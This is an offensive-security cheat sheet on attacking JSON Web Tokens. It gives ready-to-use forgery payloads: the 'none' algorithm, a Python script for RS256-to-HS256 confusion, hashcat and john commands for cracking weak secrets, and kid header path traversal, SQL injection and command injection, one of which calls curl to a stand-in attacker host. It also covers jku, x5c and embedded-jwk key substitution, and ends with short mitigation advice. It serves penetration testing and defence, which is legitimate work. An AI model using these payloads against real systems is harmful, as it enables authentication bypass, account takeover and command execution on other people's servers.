# JSON Web Token (JWT)

> JWTs are widely used as session / authentication tokens. Misconfigurations and implementation bugs let attackers forge or escalate tokens.

## Summary

- [Anatomy](#anatomy)
- [Tools](#tools)
- [None Algorithm](#none-algorithm)
- [Algorithm Confusion (RS256 → HS256)](#algorithm-confusion-rs256--hs256)
- [Weak Secret (Brute-force)](#weak-secret-brute-force)
- [`kid` Header Abuse](#kid-header-abuse)
- [`jku` / `x5u` / `x5c` Abuse](#jku--x5u--x5c-abuse)
- [JWE / JWK Tricks](#jwe--jwk-tricks)
- [Common Logic Flaws](#common-logic-flaws)
- [Mitigation](#mitigation)
- [References](#references)

## Anatomy

```
<base64url(header)>.<base64url(payload)>.<base64url(signature)>
```

Decode header & payload (no key needed):

```bash
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
```

Headers of interest:

| Field | Meaning |
|-------|---------|
| `alg` | signing algorithm |
| `typ` | always `JWT` |
| `kid` | key ID — points to a key in a key-store |
| `jwk` | inline public key |
| `jku` | URL to fetch JWK Set |
| `x5u` | URL to fetch x.509 cert |
| `x5c` | inline x.509 cert chain |

## Tools

- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwt.io](https://jwt.io)
- [hashcat](https://hashcat.net/hashcat/) (mode 16500 for JWT HS256)
- [jwtcrack](https://github.com/lmammino/jwt-cracker)

## None Algorithm

Set `alg` to `none` and strip the signature:

```
header  = {"alg":"none","typ":"JWT"}
payload = {"user":"admin"}
token   = base64url(header) + "." + base64url(payload) + "."
```

Variations to try: `none`, `None`, `NONE`, `nOne`.

## Algorithm Confusion (RS256 → HS256)

Server expects RS256 (verified with public key). Attacker switches `alg` to HS256 and signs the token with the **public key** as HMAC secret — vulnerable libraries verify with the public key as a shared secret.

```bash
python3 jwt_tool.py <token> -X k -pk public.pem
```

Steps:

1. Obtain the public key (often at `/.well-known/jwks.json`, `/jwks`, in a JS bundle, or via `jku`).
2. Format it correctly — newline-exact, trailing newline, PEM, or DER — try each.
3. Sign manually:

```python
import hmac, hashlib, base64, json
pub = open('public.pem','rb').read()
header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode()).rstrip(b'=')
msg = header + b'.' + payload
sig = base64.urlsafe_b64encode(hmac.new(pub, msg, hashlib.sha256).digest()).rstrip(b'=')
print((msg + b'.' + sig).decode())
```

## Weak Secret (Brute-force)

```bash
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
john --format=HMAC-SHA256 token.jwt
```

Common weak secrets: `secret`, `1234`, `key`, `jwt-secret`, `your-256-bit-secret`, defaults from popular tutorials.

## `kid` Header Abuse

### Path traversal

```json
{"alg":"HS256","kid":"../../../../../dev/null","typ":"JWT"}
```

Signing key = contents of `/dev/null` → empty string → forge with empty HMAC.

### SQL injection via kid

```json
{"alg":"HS256","kid":"x' UNION SELECT 'attacker_chosen_key'-- -"}
```

If the kid is concatenated into an SQL query that returns the key.

### Command injection via kid

```json
{"kid":"x|`curl attacker.tld`"}
```

If the kid is passed to a shell.

## `jku` / `x5u` / `x5c` Abuse

### `jku` host control

If the server fetches `jku` URL without allow-listing:

```json
{"alg":"RS256","jku":"https://attacker.tld/jwks.json","typ":"JWT"}
```

Host `jwks.json` containing the attacker's public key. Sign with the corresponding private key.

### `x5c` injection — embed your own cert

```json
{"alg":"RS256","x5c":["<base64 of attacker cert>"],"typ":"JWT"}
```

If the validator trusts `x5c` without verifying the cert chain.

## JWE / JWK Tricks

### Encrypted JWT with weak alg

`alg=dir, enc=A128CBC-HS256` with predictable key.

### Embedded `jwk`

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

If the validator uses the embedded JWK — forge by embedding your own.

## Common Logic Flaws

- **Signature not verified**: server trusts token as long as it parses.
- **Same secret across environments**: dev tokens valid in prod.
- **`exp` not checked**: indefinite tokens.
- **`aud` not checked**: token issued for service A accepted by service B.
- **`iss` not checked**: token from any issuer accepted.
- **Token in URL**: leaks via Referer / logs / browser history.
- **Critical claims server-side ignored** (`role:"admin"` ignored in favor of separate session lookup — but still worth trying).

## Mitigation

- Pin the **expected algorithm** server-side; don't accept the token's `alg` blindly.
- Reject `alg: none` always.
- Allow-list `jku` / `x5u` URLs.
- Use **strong, random secrets** (≥ 256 bits) and rotate them.
- Validate `exp`, `nbf`, `iat`, `aud`, `iss` strictly.
- Consider **PASETO** or **session cookies** if JWT is overkill.

## References

- [PortSwigger — JWT](https://portswigger.net/web-security/jwt)
- [HackTricks — JWT Attacks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Auth0 — JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)
